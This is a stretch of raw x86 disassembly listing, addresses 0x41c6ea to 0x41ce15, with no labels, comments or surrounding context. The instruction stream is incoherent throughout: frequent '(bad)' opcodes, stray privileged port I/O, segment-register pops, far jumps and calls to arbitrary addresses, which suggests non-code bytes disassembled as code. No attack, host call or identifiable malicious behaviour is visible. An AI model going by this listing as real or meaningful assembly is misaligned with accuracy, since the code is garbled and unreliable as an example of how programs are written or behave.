  41c6ea:	or     BYTE PTR [ebp+ecx*4-0x11],bl
  41c6ee:	pop    ss
  41c6ef:	stos   DWORD PTR es:[edi],eax
  41c6f0:	sar    bh,cl
  41c6f2:	sbb    al,0x23
  41c6f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6f5:	or     DWORD PTR [bx],esp
  41c6f8:	jecxz  0x41c69c
  41c6fa:	push   ss
  41c6fb:	loopne 0x41c77c
  41c6fd:	mov    WORD PTR [edi],cs
  41c6ff:	cld    
  41c700:	mul    BYTE PTR [ecx-0x35]
  41c703:	(bad)  
  41c704:	add    eax,0x28232c73
  41c709:	lods   eax,DWORD PTR ds:[esi]
  41c70a:	das    
  41c70b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c70c:	ja     0x41c72e
  41c70e:	push   es
  41c70f:	stos   BYTE PTR es:[edi],al
  41c710:	clc    
  41c711:	or     DWORD PTR [ebx-0x2c],ecx
  41c714:	add    edi,ebp
  41c716:	das    
  41c717:	mov    al,ds:0x52b5bce9
  41c71c:	sbb    bl,BYTE PTR es:0xe647fc29
  41c723:	into   
  41c724:	cmp    bh,cl
  41c726:	dec    ebp
  41c727:	xchg   edx,eax
  41c728:	push   ebp
  41c729:	xchg   ecx,eax
  41c72a:	sar    BYTE PTR [ebx-0x1f032953],cl
  41c730:	push   0xffffffaa
  41c732:	and    eax,0xe0da58f9
  41c737:	xchg   esi,eax
  41c738:	fcom   DWORD PTR [edi]
  41c73a:	ja     0x41c734
  41c73c:	mov    edx,DWORD PTR [ecx+0x3373ce6]
  41c742:	xor    dl,BYTE PTR [edi+0x6b]
  41c745:	test   al,0x5d
  41c747:	or     bh,BYTE PTR [ecx]
  41c749:	or     DWORD PTR [ecx],esi
  41c74b:	xchg   esi,eax
  41c74c:	stos   DWORD PTR es:[edi],eax
  41c74d:	mov    dh,0x68
  41c74f:	(bad)  
  41c750:	retf   0xd0c2
  41c753:	xchg   ebx,eax
  41c754:	aaa    
  41c755:	(bad)  
  41c757:	cmp    DWORD PTR [ebp+0x4d],ebp
  41c75a:	inc    esp
  41c75b:	outs   dx,DWORD PTR ds:[esi]
  41c75c:	jns    0x41c784
  41c75e:	mov    ebp,0x1d197e99
  41c763:	add    ebx,eax
  41c765:	(bad)  
  41c766:	push   esp
  41c767:	pop    ss
  41c768:	aas    
  41c769:	cmp    ch,ah
  41c76b:	inc    dh
  41c76d:	pop    ds
  41c76e:	mov    WORD PTR [esi+ecx*1+0x42],es
  41c772:	fbld   TBYTE PTR [ecx-0x73029dd0]
  41c778:	dec    ebp
  41c779:	xor    eax,edi
  41c77b:	mov    BYTE PTR [ebx+0x35],0x62
  41c77f:	pop    esp
  41c780:	sti    
  41c781:	mov    ebx,DWORD PTR [ebp-0x3299a034]
  41c787:	xchg   ebp,eax
  41c788:	(bad)  [edi+ecx*8]
  41c78b:	pusha  
  41c78c:	jl     0x41c728
  41c78e:	ret    
  41c78f:	stos   DWORD PTR es:[edi],eax
  41c790:	xor    esp,ecx
  41c792:	add    DWORD PTR [ebx],edx
  41c794:	call   0x3eced488
  41c799:	pop    esp
  41c79a:	add    eax,0x3ef8ef8e
  41c79f:	pop    ecx
  41c7a0:	mov    ebp,DWORD PTR [esp+eiz*8-0x52c10f94]
  41c7a7:	test   BYTE PTR [ecx+0x7f932214],cl
  41c7ad:	in     al,dx
  41c7ae:	xchg   esi,eax
  41c7af:	sahf   
  41c7b0:	mov    al,0xd3
  41c7b2:	call   0x50141111
  41c7b7:	sbb    eax,0x4aeab5b8
  41c7bc:	push   edx
  41c7bd:	push   es
  41c7be:	pop    edx
  41c7bf:	sub    al,0x54
  41c7c1:	ret    0x34bb
  41c7c4:	push   esp
  41c7c5:	inc    BYTE PTR [ebx-0x2c24d47]
  41c7cb:	fmul   QWORD PTR [edx+esi*8+0x1454f1a9]
  41c7d2:	aad    0xcf
  41c7d4:	inc    edx
  41c7d5:	xor    DWORD PTR [eax+0x24],eax
  41c7d8:	add    cl,BYTE PTR [edi-0x5526971e]
  41c7de:	in     eax,0xf5
  41c7e0:	pop    ebp
  41c7e1:	push   es
  41c7e2:	mov    esp,0xc622893e
  41c7e7:	mul    BYTE PTR [edx+ebp*1-0xadfa2ef]
  41c7ee:	call   DWORD PTR [ebp+eax*2+0x1a051ee]
  41c7f5:	fild   WORD PTR [ebp-0x45]
  41c7f8:	lahf   
  41c7f9:	rcl    DWORD PTR [ecx+0x2c37ecc0],0x36
  41c800:	adc    al,0xd2
  41c802:	out    dx,al
  41c803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c804:	cmp    DWORD PTR [edi-0x3b4e3675],esi
  41c80a:	or     edi,edx
  41c80c:	cmp    BYTE PTR [esi-0x27e4883d],ch
  41c812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c813:	aad    0x6b
  41c815:	enter  0xb35c,0x8d
  41c819:	push   es
  41c81a:	retf   0xc1e0
  41c81d:	(bad)  
  41c81e:	fld    DWORD PTR [esi+0x4ee89f0c]
  41c824:	ss (bad) 
  41c826:	adc    bh,bl
  41c828:	add    al,0xa5
  41c82a:	cwde   
  41c82b:	pop    esi
  41c82c:	(bad)
  41c830:	jmp    0xdfcebc
  41c835:	push   eax
  41c836:	mov    eax,DWORD PTR [eax+0x2eef2bad]
  41c83c:	sub    eax,0x3fd02e8b
  41c841:	push   cs
  41c842:	mov    ebx,edi
  41c844:	adc    dl,dl
  41c846:	jge    0x41c845
  41c848:	jmp    0x41c86c
  41c84a:	int    0x0
  41c84c:	dec    esp
  41c84d:	ins    DWORD PTR es:[edi],dx
  41c84e:	retf   
  41c84f:	adc    al,0xb2
  41c851:	popa   
  41c852:	jnp    0x41c8aa
  41c854:	dec    edi
  41c855:	mov    esp,0x679915b6
  41c85a:	aad    0xec
  41c85c:	jne    0x41c87a
  41c85e:	neg    BYTE PTR [eax+0x5e60ac43]
  41c864:	aas    
  41c865:	mov    BYTE PTR [edx-0x2db54550],dh
  41c86b:	js     0x41c88c
  41c86d:	imul   esp,DWORD PTR [esi-0x58],0x3ae43e9
  41c874:	and    DWORD PTR [esp+ecx*2+0x1a],eax
  41c878:	(bad)  
  41c879:	aad    0x12
  41c87b:	mov    ah,0xe8
  41c87d:	mov    DWORD PTR [esi+ebp*4+0x14],ebx
  41c881:	mov    al,0x58
  41c883:	in     al,dx
  41c884:	jne    0x41c877
  41c886:	ss dec ecx
  41c888:	inc    esi
  41c889:	push   0x9d1fde87
  41c88e:	rcl    edi,1
  41c890:	jns    0x41c887
  41c892:	div    DWORD PTR [ebx+esi*4]
  41c895:	into   
  41c896:	mov    al,ds:0xa5e02ece
  41c89b:	push   ss
  41c89c:	mov    esp,0x81c33e39
  41c8a1:	ins    DWORD PTR es:[edi],dx
  41c8a2:	pop    ds
  41c8a3:	test   dl,ch
  41c8a5:	dec    esi
  41c8a6:	or     al,0x45
  41c8a8:	push   ecx
  41c8a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8aa:	pop    edx
  41c8ab:	jo     0x41c838
  41c8ad:	add    DWORD PTR [ecx+eax*2],ebp
  41c8b0:	xchg   ebp,edi
  41c8b2:	mov    ch,0xb8
  41c8b4:	mov    ecx,0xce69d8b6
  41c8b9:	add    bh,ah
  41c8bb:	xchg   esi,eax
  41c8bc:	gs dec ebx
  41c8be:	push   ebp
  41c8bf:	dec    edi
  41c8c0:	ror    DWORD PTR [edx-0x62ce468a],1
  41c8c6:	sub    esi,DWORD PTR [edx-0x40]
  41c8c9:	arpl   si,ax
  41c8cb:	aas    
  41c8cc:	inc    ebx
  41c8cd:	jne    0x41c8ac
  41c8cf:	stc    
  41c8d0:	or     bh,dh
  41c8d2:	or     DWORD PTR [ebp+0x4d2b6499],esi
  41c8d8:	(bad)  ds:0xaa7c03e3
  41c8de:	and    eax,0x436062a9
  41c8e3:	mov    eax,0x2e3d94de
  41c8e8:	fdivr  QWORD PTR [ebx-0x72]
  41c8eb:	and    dl,al
  41c8ed:	outs   dx,BYTE PTR ds:[esi]
  41c8ee:	xchg   edi,eax
  41c8ef:	push   ecx
  41c8f0:	pop    ebx
  41c8f1:	lahf   
  41c8f2:	lahf   
  41c8f3:	inc    edx
  41c8f4:	inc    esp
  41c8f5:	inc    ebx
  41c8f6:	std    
  41c8f7:	cmovge edi,esi
  41c8fa:	fcom   QWORD PTR [edi-0x7a]
  41c8fd:	popf   
  41c8fe:	push   0xd0121dc7
  41c903:	arpl   WORD PTR [edi-0x51],bp
  41c906:	in     eax,0x7a
  41c908:	out    dx,eax
  41c909:	call   0x74d6ff94
  41c90e:	dec    esp
  41c90f:	ds mov esi,0x969ebb0a
  41c915:	(bad)  
  41c917:	lods   al,BYTE PTR ds:[esi]
  41c918:	sbb    DWORD PTR [edx-0x23593a25],esp
  41c91e:	push   es
  41c91f:	outs   dx,DWORD PTR ds:[esi]
  41c920:	iret   
  41c921:	mov    cl,0x91
  41c923:	retf   
  41c924:	or     ebx,DWORD PTR [edi-0x233ce98]
  41c92a:	xchg   ebp,eax
  41c92b:	(bad)  
  41c92d:	sbb    eax,0xb4e9232d
  41c932:	xor    DWORD PTR [eiz*2+0x29257ce8],ebx
  41c939:	xchg   esp,eax
  41c93a:	arpl   WORD PTR [edx],ax
  41c93c:	or     ebx,DWORD PTR [ebp+0x78]
  41c93f:	(bad)  
  41c940:	test   eax,0xfaa2f53a
  41c945:	hlt    
  41c946:	pop    ds
  41c947:	xchg   esp,eax
  41c948:	scas   al,BYTE PTR es:[edi]
  41c949:	or     ebp,0xe
  41c94c:	jne    0x41c9c5
  41c94e:	cmp    al,al
  41c950:	outs   dx,DWORD PTR ds:[esi]
  41c951:	cmp    BYTE PTR [eax-0x53],bh
  41c954:	repz div DWORD PTR [edx]
  41c957:	mov    ebx,0x5ba36633
  41c95c:	outs   dx,BYTE PTR ds:[esi]
  41c95d:	dec    esi
  41c95e:	les    edx,FWORD PTR [ecx+ecx*1]
  41c961:	call   0x11600bda
  41c966:	xlat   BYTE PTR ds:[ebx]
  41c967:	add    BYTE PTR [edx+eax*2],0x25
  41c96b:	mov    al,0x74
  41c96d:	(bad)  
  41c96f:	mov    ebp,DWORD PTR [ebp-0x371b294a]
  41c975:	push   0x3f8dd364
  41c97a:	mov    cl,0xc3
  41c97c:	xor    edi,DWORD PTR [esi+0x5c258c27]
  41c982:	mov    ebp,DWORD PTR [esi-0x53c2fb31]
  41c988:	jl     0x41c926
  41c98a:	int3   
  41c98b:	aas    
  41c98c:	adc    al,0x45
  41c98e:	add    BYTE PTR [esi*4+0x3b096ba8],ch
  41c995:	jae    0x41c9d3
  41c997:	add    eax,0x78a594e6
  41c99c:	stos   BYTE PTR es:[edi],al
  41c99d:	mov    bl,0xa8
  41c99f:	test   DWORD PTR [ecx+0x72baf9cd],0xc2d7d3e4
  41c9a9:	and    al,0x6b
  41c9ab:	stos   BYTE PTR es:[edi],al
  41c9ac:	push   0x13
  41c9ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9af:	add    al,0x33
  41c9b1:	xchg   esi,eax
  41c9b2:	xchg   esp,eax
  41c9b3:	pop    ds
  41c9b4:	(bad)  
  41c9b5:	cmp    bl,BYTE PTR [ebp+0x1a1840a6]
  41c9bb:	mov    DWORD PTR [ecx],esi
  41c9bd:	mov    ecx,0xb74b5160
  41c9c2:	mov    esp,0xfcd37dcd
  41c9c7:	dec    esp
  41c9c8:	jmp    0x3048:0xa7387176
  41c9cf:	mov    edi,0xf4e7527f
  41c9d4:	jnp    0x41c958
  41c9d6:	mov    dh,0xc3
  41c9d8:	outs   dx,DWORD PTR ds:[esi]
  41c9d9:	jo     0x41ca13
  41c9db:	or     al,0xe7
  41c9dd:	mov    ecx,0xd7005dca
  41c9e2:	cmc    
  41c9e3:	pop    ebp
  41c9e4:	cdq    
  41c9e5:	mov    ecx,0xbe42a69d
  41c9ea:	xor    BYTE PTR [esi],bl
  41c9ec:	in     al,dx
  41c9ed:	or     DWORD PTR [ecx-0x2ecac651],esi
  41c9f3:	icebp  
  41c9f4:	js     0x41c9cd
  41c9f6:	outs   dx,DWORD PTR ds:[esi]
  41c9f7:	add    DWORD PTR [edi+0x42cb51c],0xffffffc9
  41c9fe:	ds or  al,0xb
  41ca01:	pop    edx
  41ca02:	loop   0x41ca60
  41ca04:	cmp    eax,0xaff63f5a
  41ca09:	sbb    al,BYTE PTR [edx+0x3907d273]
  41ca0f:	sti    
  41ca10:	lds    edx,FWORD PTR [ebp-0x55227cfe]
  41ca16:	nop
  41ca17:	pop    eax
  41ca18:	jo     0x41ca3d
  41ca1a:	nop
  41ca1b:	js     0x41ca68
  41ca1d:	ret    0xbedb
  41ca20:	cmp    ebx,DWORD PTR [ebx-0x533fd19d]
  41ca26:	(bad)  
  41ca27:	mov    ds:0x6dab53f,eax
  41ca2c:	jno    0x41ca36
  41ca2e:	scas   al,BYTE PTR es:[edi]
  41ca2f:	inc    ebx
  41ca30:	pop    ss
  41ca31:	mov    esi,0x1dbe76c3
  41ca36:	sub    ah,BYTE PTR [eax+0x2c7ff802]
  41ca3c:	push   ss
  41ca3d:	(bad)  
  41ca3f:	pop    edx
  41ca40:	mov    DWORD PTR [esi],esi
  41ca42:	into   
  41ca43:	fdiv   QWORD PTR [eax]
  41ca45:	imul   DWORD PTR [edi+0x29a52a1b]
  41ca4b:	mov    ch,0x37
  41ca4d:	ins    DWORD PTR es:[edi],dx
  41ca4e:	outs   dx,BYTE PTR ds:[esi]
  41ca4f:	int    0x30
  41ca51:	push   ebx
  41ca52:	or     BYTE PTR [edi-0x3b],bl
  41ca55:	jb     0x41ca42
  41ca57:	cmp    esi,esp
  41ca59:	(bad)  
  41ca5b:	in     al,dx
  41ca5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca5d:	xchg   DWORD PTR [edi-0x6341cb11],edx
  41ca63:	test   al,0x95
  41ca65:	xchg   edx,eax
  41ca66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca67:	adc    al,0x14
  41ca69:	cld    
  41ca6a:	sub    eax,0x7150faf0
  41ca6f:	call   0x2b9e3b38
  41ca74:	xchg   ecx,eax
  41ca75:	rol    BYTE PTR [eax-0x65134994],0xb1
  41ca7c:	fld    DWORD PTR [ecx]
  41ca7e:	or     BYTE PTR [esp+eax*4-0x7e],cl
  41ca82:	ins    BYTE PTR es:[edi],dx
  41ca83:	mov    bl,0x47
  41ca85:	cli    
  41ca86:	mov    edi,0xbd338a6a
  41ca8b:	mov    WORD PTR [ecx-0x4a7e39fc],?
  41ca91:	inc    ebx
  41ca92:	xor    eax,0xc8246291
  41ca97:	loope  0x41cabb
  41ca99:	xor    DWORD PTR [edi+edx*4+0x63ddb56a],ebp
  41caa0:	adc    eax,0xddec0cb2
  41caa5:	pusha  
  41caa6:	mov    ds:0xfb221957,al
  41caab:	pop    edx
  41caac:	std    
  41caad:	cli    
  41caae:	push   esp
  41caaf:	mov    dl,0x85
  41cab1:	stos   DWORD PTR es:[edi],eax
  41cab2:	mov    al,0x70
  41cab4:	iret   
  41cab5:	dec    edx
  41cab6:	push   ebp
  41cab7:	outs   dx,BYTE PTR ds:[esi]
  41cab8:	mov    ebx,0x65fb6ff4
  41cabd:	les    esi,FWORD PTR [ebp-0x5d]
  41cac0:	lahf   
  41cac1:	push   edx
  41cac2:	fs jb  0x41ca79
  41cac5:	jecxz  0x41caf7
  41cac7:	mov    ch,0x80
  41cac9:	(bad)  
  41caca:	lods   al,BYTE PTR ds:[esi]
  41cacb:	jne    0x41caea
  41cacd:	push   es
  41cace:	imul   eax,DWORD PTR [esi+0x632f9f22],0x3a
  41cad5:	arpl   WORD PTR [edx],dx
  41cad7:	ret    
  41cad8:	or     DWORD PTR [edi+0x5f6523d6],eax
  41cade:	push   edx
  41cadf:	imul   esi,DWORD PTR [ecx],0x46
  41cae2:	aam    0x6d
  41cae4:	(bad)  
  41cae5:	addr16 pop edi
  41cae7:	fdivr  QWORD PTR [ecx+0x74]
  41caea:	in     al,dx
  41caeb:	cwde   
  41caec:	int3   
  41caed:	aad    0xc0
  41caef:	icebp  
  41caf0:	push   edi
  41caf1:	jl     0x41ca83
  41caf3:	leave  
  41caf4:	and    ch,BYTE PTR [eax]
  41caf6:	pop    ebx
  41caf7:	dec    edi
  41caf8:	adc    eax,0x618e1756
  41cafd:	and    DWORD PTR [edi],edi
  41caff:	push   0xffffffb3
  41cb01:	sbb    DWORD PTR [edi-0x57],ecx
  41cb04:	push   0xd3d5c101
  41cb09:	xor    DWORD PTR [edx],0xffffff81
  41cb0c:	ror    bh,cl
  41cb0e:	and    al,0xb3
  41cb10:	push   cs
  41cb11:	inc    eax
  41cb12:	push   ebx
  41cb13:	inc    esp
  41cb14:	mov    eax,0x85d0d8e0
  41cb19:	mov    BYTE PTR [ebp-0x185a83c1],al
  41cb1f:	imul   eax,DWORD PTR [ebx],0xffffff90
  41cb22:	xchg   ecx,eax
  41cb23:	ror    DWORD PTR [edi],cl
  41cb25:	clc    
  41cb26:	dec    eax
  41cb27:	in     al,dx
  41cb28:	add    bh,BYTE PTR [ebx]
  41cb2a:	psraw  xmm6,XMMWORD PTR [esi+edi*4]
  41cb2f:	repz xlat BYTE PTR ds:[ebx]
  41cb31:	dec    ebx
  41cb32:	enter  0x8a93,0x2b
  41cb36:	mov    WORD PTR [eax-0x53ce017c],gs
  41cb3c:	cmp    ecx,ebp
  41cb3e:	xchg   ebx,eax
  41cb3f:	(bad)  
  41cb40:	data16 sub BYTE PTR [ecx+0x376e4df2],0x78
  41cb48:	pop    ds
  41cb49:	repnz lds esp,FWORD PTR [eax+0x4a]
  41cb4d:	push   ecx
  41cb4e:	into   
  41cb4f:	sub    BYTE PTR [ebp*2+0x5d69ad90],bl
  41cb56:	push   es
  41cb57:	pop    edx
  41cb58:	lahf   
  41cb59:	fisub  WORD PTR ss:[edx-0x43]
  41cb5d:	ins    DWORD PTR es:[edi],dx
  41cb5e:	xchg   edi,eax
  41cb5f:	daa    
  41cb60:	in     eax,dx
  41cb61:	sbb    ebx,ebx
  41cb63:	adc    BYTE PTR [ebp-0x5b],dl
  41cb66:	and    DWORD PTR [eax-0x4a8b728e],0x4
  41cb6d:	test   DWORD PTR [ebx-0x52],ebp
  41cb70:	(bad)  
  41cb71:	aad    0x68
  41cb73:	xlat   BYTE PTR ds:[ebx]
  41cb74:	dec    edi
  41cb75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb76:	rol    DWORD PTR [esp+eiz*8],0x5d
  41cb7a:	jp     0x41cb6f
  41cb7c:	inc    ecx
  41cb7d:	mov    ebp,0x226e073b
  41cb82:	pop    ebx
  41cb83:	jo     0x41cb2f
  41cb85:	xor    bh,bl
  41cb87:	sbb    ch,cl
  41cb89:	sub    eax,0x36799e36
  41cb8e:	fnsave [ebx-0x1]
  41cb91:	(bad)  
  41cb92:	fcomp  QWORD PTR [edx]
  41cb94:	add    eax,0x96e8fbc8
  41cb99:	mov    ebp,0x626f362
  41cb9e:	stc    
  41cb9f:	aam    0x9c
  41cba1:	ja     0x41cbdd
  41cba3:	cld    
  41cba4:	push   edx
  41cba5:	xor    ah,BYTE PTR [edi+0x25]
  41cba8:	sbb    esi,DWORD PTR [edx+0x34344a6a]
  41cbae:	sbb    eax,DWORD PTR [esi-0x77db3bb0]
  41cbb4:	popf   
  41cbb5:	push   edi
  41cbb6:	je     0x41cc33
  41cbb8:	iret   
  41cbb9:	das    
  41cbba:	int3   
  41cbbb:	push   ebx
  41cbbc:	ins    BYTE PTR es:[edi],dx
  41cbbd:	sahf   
  41cbbe:	in     al,dx
  41cbbf:	ret    0x47f8
  41cbc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbc3:	lods   al,BYTE PTR ds:[esi]
  41cbc4:	int    0xd7
  41cbc6:	adc    DWORD PTR [ebx+0x1bd8e7ce],esp
  41cbcc:	mov    dl,0xe2
  41cbce:	pop    eax
  41cbcf:	adc    eax,0xee70664c
  41cbd4:	xor    ebp,ebx
  41cbd6:	sub    eax,0xb7cb3447
  41cbdb:	loopne 0x41cc40
  41cbdd:	stos   BYTE PTR es:[edi],al
  41cbde:	rcr    bh,1
  41cbe0:	aaa    
  41cbe1:	in     al,0x7b
  41cbe3:	dec    eax
  41cbe4:	pop    esp
  41cbe5:	or     dh,bh
  41cbe7:	mov    bl,0x3
  41cbe9:	jbe    0x41cba5
  41cbeb:	xor    cl,dh
  41cbed:	lods   al,BYTE PTR ds:[esi]
  41cbee:	xchg   ebp,eax
  41cbef:	pop    ds
  41cbf0:	(bad)  
  41cbf1:	cli    
  41cbf2:	add    ch,cl
  41cbf4:	dec    ebx
  41cbf5:	xor    DWORD PTR [edi+edx*2+0x7b],0xffffff98
  41cbfa:	mov    ebp,0xe72dbb91
  41cbff:	add    eax,0x1d58f18b
  41cc04:	mov    ebx,0x7e3475c9
  41cc09:	dec    DWORD PTR [ecx+ebp*8]
  41cc0c:	in     al,0x7c
  41cc0e:	and    edx,eax
  41cc10:	fadd   QWORD PTR [ebx+0x44]
  41cc13:	sbb    ah,BYTE PTR [ecx]
  41cc15:	dec    edi
  41cc16:	daa    
  41cc17:	xchg   edi,eax
  41cc18:	pop    esp
  41cc19:	cmp    bl,BYTE PTR [ebx]
  41cc1b:	pop    ebx
  41cc1c:	xchg   edx,eax
  41cc1d:	jb     0x41cbcd
  41cc1f:	clc    
  41cc20:	pushw  ss
  41cc22:	mul    DWORD PTR [ecx-0x7aa7833c]
  41cc28:	int    0x3a
  41cc2a:	pop    edx
  41cc2b:	outs   dx,DWORD PTR ds:[esi]
  41cc2c:	sbb    esi,DWORD PTR [ebx+ebx*2-0x11]
  41cc30:	push   0xa7008ab1
  41cc35:	add    bl,BYTE PTR [ebx-0x15]
  41cc38:	xchg   ecx,ecx
  41cc3a:	inc    esi
  41cc3b:	pop    ds
  41cc3c:	mov    esi,?
  41cc3e:	outs   dx,DWORD PTR ds:[esi]
  41cc3f:	pop    ecx
  41cc40:	fbstp  TBYTE PTR [edi]
  41cc42:	lahf   
  41cc43:	loop   0x41cc0d
  41cc45:	jmp    0x41cc19
  41cc47:	sbb    ebp,0x24
  41cc4a:	lods   al,BYTE PTR ds:[esi]
  41cc4b:	xchg   ebp,eax
  41cc4c:	out    dx,al
  41cc4d:	or     ecx,DWORD PTR [ecx]
  41cc4f:	jl     0x41cc00
  41cc51:	xchg   edi,eax
  41cc52:	jecxz  0x41ccb4
  41cc54:	jnp    0x41cca0
  41cc56:	jg     0x41cc78
  41cc58:	jns    0x41ccd6
  41cc5a:	shr    cl,1
  41cc5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc5d:	xchg   esp,eax
  41cc5e:	dec    edx
  41cc5f:	push   es
  41cc60:	out    0xc2,eax
  41cc62:	mov    esi,0xef7a26ce
  41cc67:	jne    0x41ccd2
  41cc69:	scas   al,BYTE PTR es:[edi]
  41cc6a:	in     eax,0x98
  41cc6c:	dec    edi
  41cc6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc6e:	mov    eax,0xff9db54e
  41cc73:	repnz mov eax,ds:0x504c71b9
  41cc79:	mov    dh,BYTE PTR fs:[edi+0xe]
  41cc7d:	mov    bh,0xd7
  41cc7f:	mov    gs,esi
  41cc81:	ret    
  41cc82:	cmp    al,0x78
  41cc84:	push   ebp
  41cc85:	nop
  41cc86:	test   al,0x1a
  41cc88:	call   0x1efcb4b3
  41cc8d:	rcr    DWORD PTR [esi-0x4],cl
  41cc90:	xor    ecx,edi
  41cc92:	loope  0x41cc5c
  41cc94:	test   DWORD PTR [edi+0x2d],edx
  41cc97:	jnp    0x41ccac
  41cc99:	mov    ds:0x83a61d32,al
  41cc9e:	inc    edx
  41cc9f:	mov    bh,0x34
  41cca1:	(bad)  
  41cca3:	fist   WORD PTR [esi+eiz*8-0x72]
  41cca7:	mov    al,ds:0xd60850c5
  41ccac:	ins    DWORD PTR es:[edi],dx
  41ccad:	xchg   edx,eax
  41ccae:	pop    esp
  41ccaf:	pop    es
  41ccb0:	pop    ebx
  41ccb1:	or     dl,ah
  41ccb3:	not    DWORD PTR fs:[edi-0x58421fa7]
  41ccba:	xchg   BYTE PTR [ebx-0x57c0625c],bh
  41ccc0:	and    dh,bl
  41ccc2:	ins    DWORD PTR es:[edi],dx
  41ccc3:	jns    0x41cc5a
  41ccc5:	mov    edi,0x588b8c4c
  41ccca:	mov    DWORD PTR [edi+0x61],edx
  41cccd:	adc    DWORD PTR [ebp-0x2daaa3a5],ecx
  41ccd3:	or     esi,0x2676c599
  41ccd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccda:	ficom  DWORD PTR [eax-0x3eebd192]
  41cce0:	fdivr  QWORD PTR [esi+0x6e18ec41]
  41cce6:	mov    bl,0x98
  41cce8:	aas    
  41cce9:	push   esi
  41ccea:	adc    eax,0x5894d013
  41ccef:	xchg   ecx,eax
  41ccf0:	lock cmp al,0xa9
  41ccf3:	leave  
  41ccf4:	scas   al,BYTE PTR es:[edi]
  41ccf5:	bound  ebx,QWORD PTR [ebp+0x738d57f5]
  41ccfb:	in     al,dx
  41ccfc:	cmp    bl,BYTE PTR [edx]
  41ccfe:	mov    ecx,0xfe7c1f8c
  41cd03:	xor    dh,bl
  41cd05:	jmp    0xc3185ce9
  41cd0a:	sub    ebp,ebp
  41cd0c:	xor    esp,edi
  41cd0e:	stc    
  41cd0f:	xchg   edx,eax
  41cd10:	mov    eax,0xf9a31455
  41cd15:	lahf   
  41cd16:	sbb    ax,0x4fcb
  41cd1a:	leave  
  41cd1b:	dec    edx
  41cd1c:	mov    dl,0x40
  41cd1e:	es scas eax,DWORD PTR es:[edi]
  41cd20:	adc    esp,ebp
  41cd22:	mov    dh,ah
  41cd24:	test   eax,0x29ad4fc3
  41cd29:	jbe    0x41cd63
  41cd2b:	mov    dh,0xd6
  41cd2d:	mov    dl,0x7d
  41cd30:	adc    al,0x79
  41cd32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd33:	(bad)  
  41cd34:	addr16 xchg esp,eax
  41cd36:	daa    
  41cd37:	int    0x79
  41cd39:	cmp    edi,ebp
  41cd3b:	lods   al,BYTE PTR ds:[esi]
  41cd3c:	add    edx,DWORD PTR gs:[edx-0x3079fe77]
  41cd43:	stos   WORD PTR es:[edi],ax
  41cd45:	sahf   
  41cd46:	sbb    al,0x28
  41cd48:	stc    
  41cd49:	fmul   QWORD PTR [esi+0x6bd2b166]
  41cd4f:	mov    ebp,0x84de9605
  41cd54:	sub    ah,BYTE PTR [eax-0x76]
  41cd57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd58:	repnz ss in al,0x93
  41cd5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd5d:	inc    ecx
  41cd5e:	jge    0x41cd38
  41cd60:	pop    esi
  41cd61:	sbb    al,0x62
  41cd63:	sti    
  41cd64:	pop    eax
  41cd65:	popf   
  41cd66:	pop    es
  41cd67:	cwde   
  41cd68:	scas   al,BYTE PTR es:[edi]
  41cd69:	rol    BYTE PTR [edx],0xe8
  41cd6c:	pop    es
  41cd6d:	stos   DWORD PTR es:[edi],eax
  41cd6e:	fnstenv [esi-0x79601433]
  41cd74:	xchg   BYTE PTR [ebp-0x53ffcd33],bh
  41cd7a:	in     eax,0x18
  41cd7c:	les    eax,FWORD PTR [edi-0x73ec527c]
  41cd82:	imul   edx,DWORD PTR [ebp-0x59],0x20bc1264
  41cd89:	mov    al,gs:0xdd25d779
  41cd8f:	cwde   
  41cd90:	add    edi,DWORD PTR [edi]
  41cd92:	sub    dl,dl
  41cd94:	call   0x90f19fb6
  41cd99:	dec    edx
  41cd9a:	loopne 0x41cdd3
  41cd9c:	mov    ecx,0x3b8273fa
  41cda1:	add    DWORD PTR [ebx],esp
  41cda3:	and    ebp,DWORD PTR [ebp+0x7c]
  41cda6:	xor    eax,DWORD PTR [eax+0x73f10be9]
  41cdac:	call   0x3ccd0626
  41cdb1:	or     DWORD PTR [ebp-0x46],0xe5198bf3
  41cdb8:	leave  
  41cdb9:	pusha  
  41cdba:	mov    WORD PTR [ebx+ebp*8],?
  41cdbd:	retf   
  41cdbe:	adc    edx,DWORD PTR [esi]
  41cdc0:	fst    QWORD PTR [edx+eax*8-0x2c6b553c]
  41cdc7:	xor    eax,0xefdb4998
  41cdcc:	les    ebx,FWORD PTR [ebx+ebx*4]
  41cdcf:	inc    edi
  41cdd0:	sub    esp,0x7a
  41cdd3:	jae    0x41ce38
  41cdd5:	push   esi
  41cdd6:	ror    BYTE PTR [eax-0x6b4720a6],1
  41cddc:	jl     0x41ce2d
  41cdde:	mov    ecx,esp
  41cde0:	aas    
  41cde1:	shr    BYTE PTR [ebx-0x53],cl
  41cde4:	xor    DWORD PTR [ecx],0xffffffa0
  41cde7:	test   eax,0xfd411878
  41cdec:	outs   dx,DWORD PTR ds:[esi]
  41cded:	push   eax
  41cdee:	dec    ebx
  41cdef:	shl    BYTE PTR [edi],0x20
  41cdf2:	pop    ds
  41cdf3:	dec    ebx
  41cdf4:	retf   0x1d04
  41cdf7:	aas    
  41cdf8:	icebp  
  41cdf9:	out    0xc0,eax
  41cdfb:	dec    edi
  41cdfc:	sar    BYTE PTR [edx],cl
  41cdfe:	loop   0x41ce12
  41ce00:	in     al,0x57
  41ce02:	mov    ebx,0x3e41a93c
  41ce07:	dec    esi
  41ce08:	fld    QWORD PTR [esi+edi*1-0x6457955f]
  41ce0f:	stos   BYTE PTR es:[edi],al
  41ce10:	mov    ebx,0x42725d21
  41ce15:	jo     0x41ce6e
